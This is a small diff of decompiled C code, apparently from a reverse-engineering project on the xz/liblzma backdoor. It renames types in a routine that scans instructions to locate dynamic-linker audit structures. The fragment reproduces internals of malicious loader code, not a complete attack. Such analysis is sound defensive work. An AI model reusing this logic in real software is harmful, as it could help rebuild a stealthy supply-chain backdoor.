@@ -43,7 +43,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     audit_walk_cursor = search_ctx->start_addr;
     ctx_zero_cursor = &insn_ctx;
     for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
-      *(undefined4 *)&ctx_zero_cursor->instruction = 0;
+      *(u32 *)&ctx_zero_cursor->instruction = 0;
       ctx_zero_cursor = (dasm_ctx_t *)((long)ctx_zero_cursor + (ulong)bit_test_register * -8 + 4);
     }
     libcrypto_allocator = get_lzma_allocator();
@@ -115,7 +115,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
           // AutoDoc: Only advance once the LEA recomputes the expected displacement and the register filter allows it.
           if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == computed_slot_ptr) &&
              (((int)(uint)*(ushort *)search_ctx->output_register >> (decoded_pointer_register & 0x1f) & 1U) != 0)) {
-            *(undefined1 *)((long)search_ctx->output_register + 2) = decoded_mask_register;
+            *(u8 *)((long)search_ctx->output_register + 2) = decoded_mask_register;
             pattern_state = 1;
           }
         }
